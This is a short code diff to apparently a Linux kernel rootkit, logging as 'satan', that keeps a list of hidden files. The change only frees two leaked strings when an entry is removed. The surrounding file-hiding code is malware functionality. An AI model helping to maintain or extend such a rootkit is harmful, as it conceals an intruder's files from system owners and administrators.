@@ -102,6 +102,8 @@ static int hidden_files_del(const char *path)
                 if (!strcmp(f->basename, basename_buf) && !strcmp(f->filename, filename_buf)) {
                         pr_info("satan: file: removing (%s,%s) from list of hidden files .\n", f->basename, f->filename);
                         list_del(p);
+                        kfree(f->basename);
+                        kfree(f->filename);
                         kfree(f);
                         return 0;
                 }
